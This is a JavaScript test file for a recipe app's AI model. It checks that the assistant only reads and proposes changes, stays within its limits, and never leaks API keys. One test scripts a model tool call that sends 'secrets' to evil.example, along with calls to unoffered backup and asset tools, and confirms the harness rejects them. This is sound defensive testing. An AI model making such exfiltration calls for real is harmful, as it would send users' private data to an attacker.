import test from "node:test";
import assert from "node:assert/strict";
import Anthropic from "@anthropic-ai/sdk";
import { KooksError, Store } from "../mcp/store.js";
import { createTools } from "../mcp/tools.js";
import {
  anthropicClient,
  askInput,
  createAssistant,
} from "../web/assistant.js";
import { fitting } from "../shared/conversation.js";
import { fakeClaude, says, usage, uses } from "./helpers/claude.js";

const question = (text) => ({
  today: "2026-10-30",
  messages: [{ role: "user", text }],
});

function kitchen(t, script, options = {}) {
  const store = new Store(":memory:");
  const tools = new Map(createTools(store).map((tool) => [tool.name, tool]));
  const client = fakeClaude(script);
  const assistant = createAssistant({ store, tools, client, ...options });
  t.after(() => {
    assistant.close();
    store.close();
  });
  let saved = 0;
  const add = (title) =>
    tools.get("recipe_save").execute({
      request_id: `save-${++saved}`,
      recipe: { title, servings: 4 },
    }).record;
  return { store, tools, client, assistant, add };
}

// The tool results sent back on a call, by the tool use they answer.
const results = (call) =>
  Object.fromEntries(
    call.params.messages
      .at(-1)
      .content.map((block) => [block.tool_use_id, block]),
  );

test("the client takes the kitchen's key and endpoint, never the host's Anthropic settings", async (t) => {
  const junk = {
    ANTHROPIC_API_KEY: "host-key",
    ANTHROPIC_AUTH_TOKEN: "host-token",
    ANTHROPIC_BASE_URL: "https://proxy.invalid",
    ANTHROPIC_CUSTOM_HEADERS: "X-Host-Header: leaked",
    ANTHROPIC_LOG: "debug",
  };
  const before = Object.fromEntries(
    Object.keys(junk).map((name) => [name, process.env[name]]),
  );
  Object.assign(process.env, junk);
  t.after(() => {
    for (const [name, value] of Object.entries(before))
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
  });
  const sent = [];
  const logged = [];
  for (const level of ["log", "debug", "info", "warn", "error"]) {
    const original = console[level];
    console[level] = (...args) => logged.push(args);
    t.after(() => (console[level] = original));
  }
  const client = anthropicClient({
    apiKey: "kitchen-key",
    fetch: async (url, init) => {
      sent.push({ url: String(url), headers: new Headers(init.headers) });
      return new Response(JSON.stringify(says("Hello")), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    },
  });
  assert.equal(
    process.env.ANTHROPIC_CUSTOM_HEADERS,
    junk.ANTHROPIC_CUSTOM_HEADERS,
  );
  await client.beta.messages.create({
    model: "claude-opus-5-5",
    max_tokens: 10,
    messages: [{ role: "user", content: "Hi" }],
  });
  assert.equal(sent.length, 1);
  assert.match(sent[0].url, /^https:\/\/api\.anthropic\.com\/v1\/messages/);
  assert.equal(sent[0].headers.get("authorization"), "Bearer kitchen-key");
  assert.equal(sent[0].headers.get("x-api-key"), null);
  assert.equal(sent[0].headers.get("x-host-header"), null);
  assert.equal(sent[0].headers.get("traceparent"), null);
  assert.deepEqual(logged, [], "nothing about the request is printed");
});

test("the assistant reads the kitchen and proposes changes without making them", async (t) => {
  let orzo;
  const { client, assistant, add, store } = kitchen(t, [
    uses(["kooks_list", { kind: "recipe" }]),
    () =>
      uses(
        [
          "propose_plan",
          { kind: "recipe", id: orzo.id, date: "2026-11-03", servings: 2 },
        ],
        ["propose_groceries", { items: [{ name: "Lemons", quantity: 2 }] }],
        ["propose_shop_for", { week: "2026-11-03" }],
        [
          "propose_recipe_draft",
          {
            title: "Lemon rice",
            text: "Lemon rice\nServes 2\n\n1 cup rice\n1 lemon\n\n1. Cook the rice.",
          },
        ],
      ),
    says("Orzo on Tuesday, lemons on the list, and a lemon rice to try."),
  ]);
  orzo = add("Lemon orzo");
  const steps = [];
  const sequence = store.sequence();
  const answer = await assistant.ask({
    ...question("Plan Tuesday and get what we need."),
    onStep: (step) => steps.push(step),
  });
  assert.equal(store.sequence(), sequence, "nothing in the kitchen changed");
  assert.equal(
    answer.reply,
    "Orzo on Tuesday, lemons on the list, and a lemon rice to try.",
  );
  assert.deepEqual(
    answer.proposals.map(({ id, type, input }) => {
      assert.match(id, /^[0-9a-f-]{36}$/);
      return { type, ...input };
    }),
    [
      {
        type: "plan",
        kind: "recipe",
        id: orzo.id,
        date: "2026-11-03",
        slot: "Dinner",
        servings: 2,
      },
      {
        type: "groceries",
        items: [{ name: "Lemons", quantity: 2, unit: "" }],
      },
      { type: "shop", week: "2026-11-03" },
      {
        type: "draft",
        title: "Lemon rice",
        text: "Lemon rice\nServes 2\n\n1 cup rice\n1 lemon\n\n1. Cook the rice.",
      },
    ],
  );
  assert.match(
    results(client.calls[1])["use-kooks_list-0"].content,
    /"title":"Lemon orzo"/,
  );
  assert.deepEqual(steps, [
    "Thinking",
    "Looking through your recipes",
    "Thinking",
    "Getting a suggestion ready",
    "Getting a suggestion ready",
    "Getting a suggestion ready",
    "Getting a suggestion ready",
    "Thinking",
  ]);

  // Every call asks the same way, with the conversation so far.
  const [first, second, third] = client.calls;
  for (const { params, options } of client.calls) {
    assert.equal(params.model, "claude-opus-5-5");
    assert.deepEqual(params.betas, ["server-side-fallback-2026-07-01"]);
    assert.equal(params.fallbacks, "default");
    assert.deepEqual(params.output_config, { effort: "medium" });
    assert.deepEqual(params.cache_control, { type: "ephemeral" });
    assert.ok(options.signal instanceof AbortSignal);
  }
  assert.equal(
    first.params.system[1].text,
    "Today is Friday, 30 October 2026 (2026-10-30). Weeks start on Monday.",
  );
  assert.deepEqual(first.params.messages, [
    { role: "user", content: "Plan Tuesday and get what we need." },
  ]);
  assert.equal(second.params.messages.length, 3);
  assert.equal(third.params.messages.length, 5);
  for (const block of third.params.messages.at(-1).content)
    assert.match(block.content, /^Shown to the member as proposal \d\./);
  // Only reading tools and proposals are offered, and none of them reads
  // stored files or reaches the web.
  const offered = first.params.tools.map((tool) => tool.name);
  assert.deepEqual(offered, [
    "kooks_list",
    "kooks_get",
    "recipe_taxonomy",
    "recipe_suggest",
    "recipe_memory",
    "recipe_scale",
    "quantity_convert",
    "cost_week",
    "batch_list",
    "propose_plan",
    "propose_groceries",
    "propose_shop_for",
    "propose_recipe_draft",
  ]);
  for (const name of ["kooks_list", "kooks_get"]) {
    const kinds = first.params.tools.find((tool) => tool.name === name)
      .input_schema.properties.kind.enum;
    assert.ok(kinds.includes("recipe"));
    assert.ok(!kinds.includes("asset") && !kinds.includes("import"), name);
  }
  assert.equal(JSON.stringify(first.params.tools).includes("$schema"), false);
});

test("calls the assistant should not make are answered as errors, and it carries on", async (t) => {
  const { client, assistant, add } = kitchen(t, [
    uses(
      ["kooks_get", { kind: "asset", id: "photo-1" }],
      ["propose_plan", { kind: "recipe", id: "nope", date: "2026-11-03" }],
      ["propose_plan", { kind: "recipe", id: "x", date: "2026-02-30" }],
      ["propose_shop_for", { week: "2026-11-03", kind: "recipe", id: "x" }],
      ["recipe_import_link", { url: "https://evil.example/?d=secrets" }],
      ["backup_export", {}],
    ),
    says("Sorry, I couldn't find that."),
  ]);
  add("Toast");
  const answer = await assistant.ask(question("Plan something"));
  assert.deepEqual(answer.proposals, []);
  const answered = Object.values(results(client.calls[1]));
  assert.equal(answered.length, 6);
  for (const block of answered) assert.equal(block.is_error, true);
  assert.match(answered[1].content, /There is no recipe with id nope/);
  assert.match(answered[2].content, /real calendar date/);
  assert.match(answered[3].content, /either week, or kind and id/);
  assert.match(answered[4].content, /no tool named recipe_import_link/);
  assert.match(answered[5].content, /no tool named backup_export/);
});

test("a question reads at most so much, and a day's spending has a limit", async (t) => {
  const { client, assistant, add } = kitchen(
    t,
    [
      uses(
        ...Array.from({ length: 4 }, () => [
          "kooks_list",
          { kind: "recipe", limit: 100 },
        ]),
      ),
      says("Done."),
      says("Too late."),
    ],
    { dailyTokens: 2400 },
  );
  for (let n = 0; n < 100; n++) add(`Recipe ${n} ${"x".repeat(400)}`);
  await assistant.ask(question("Everything"));
  const read = Object.values(results(client.calls[1])).map((b) => b.content);
  assert.ok(read[0].length <= 40100);
  assert.match(read[0], /cut at 40000 characters/);
  assert.equal(
    read
      .slice(0, 3)
      .reduce((sum, text) => sum + text.replace(/ … \[cut.*$/, "").length, 0),
    120000,
  );
  assert.match(read[3], /as much as one question can read/);
  // Two calls of 1,200 tokens each used the day's 2,400 up.
  await assistant.ask(question("Again")).then(
    () => assert.fail("over the allowance"),
    (error) => {
      assert.equal(error.code, "ASSISTANT_BUDGET");
      assert.equal(error.status, 429);
    },
  );
  assert.equal(client.calls.length, 2, "no call once the allowance is used");
});

test("refusals, cut-off answers and failed calls end the question plainly", async (t) => {
  const secret = "sk-ant-api03-leaked account detail";
  const { assistant } = kitchen(t, [
    uses(["propose_groceries", { items: [{ name: "Milk" }] }]),
    { stop_reason: "refusal", content: [], usage },
    {
      stop_reason: "max_tokens",
      content: [{ type: "text", text: "Here is a long" }],
      usage,
    },
    new Anthropic.RateLimitError(429, { type: "error" }, secret, new Headers()),
    new Anthropic.AuthenticationError(
      401,
      { type: "error" },
      secret,
      new Headers(),
    ),
    new Anthropic.InternalServerError(
      500,
      { type: "error" },
      secret,
      new Headers(),
    ),
  ]);
  const errors = [];
  const error = console.error;
  console.error = (...args) => errors.push(args.join(" "));
  t.after(() => (console.error = error));
  assert.deepEqual(await assistant.ask(question("Milk?")), {
    reply: "I can’t help with that one. Try asking another way.",
    proposals: [],
  });
  assert.equal(
    (await assistant.ask(question("Long?"))).reply,
    "Here is a long\n\nI ran out of room there. Ask me to go on.",
  );
  for (const message of [
    /a lot of questions/,
    /isn’t set up correctly/,
    /couldn’t answer just now/,
  ])
    await assistant.ask(question("Hm?")).then(
      () => assert.fail("expected an error"),
      (failure) => {
        assert.equal(failure.code, "ASSISTANT_UNAVAILABLE");
        assert.match(failure.message, message);
        assert.ok(!failure.message.includes(secret));
      },
    );
  assert.ok(errors.length === 3 && errors.every((e) => !e.includes(secret)));
});

test("a question that takes too long ends plainly, and a conversation sent has a size", async (t) => {
  const { assistant } = kitchen(
    t,
    [
      (params, { signal }) =>
        new Promise((resolve, reject) =>
          signal.addEventListener("abort", () =>
            reject(new Anthropic.APIUserAbortError()),
          ),
        ),
    ],
    { timeLimit: 50 },
  );
  // The time limit's timer doesn't hold the process open; a server does.
  const serving = setInterval(() => {}, 1000);
  t.after(() => clearInterval(serving));
  await assistant.ask(question("Slow?")).then(
    () => assert.fail("expected an error"),
    (failure) => {
      // A Kooks error, which the server tells the member without logging.
      assert.ok(failure instanceof KooksError);
      assert.equal(failure.code, "ASSISTANT_UNAVAILABLE");
      assert.match(failure.message, /took me too long/);
    },
  );

  // A conversation of more than 60,000 characters is refused, and the app
  // sends the latest turns that fit, from a question of the member's.
  const turns = (count, size = (i) => (i % 2 ? 20000 : 4000)) =>
    Array.from({ length: count }, (_, i) => ({
      role: i % 2 ? "assistant" : "user",
      text: "x".repeat(size(i)),
    }));
  const asked = (messages) =>
    askInput.safeParse({ today: "2026-10-30", messages }).success;
  const long = turns(7);
  assert.equal(asked(long), false);
  assert.deepEqual(fitting(long), long.slice(2));
  assert.equal(asked(fitting(long)), true);
  const many = turns(41, () => 10);
  assert.equal(asked(many), false);
  assert.deepEqual(fitting(many), many.slice(2));
  assert.equal(asked(fitting(many)), true);
});
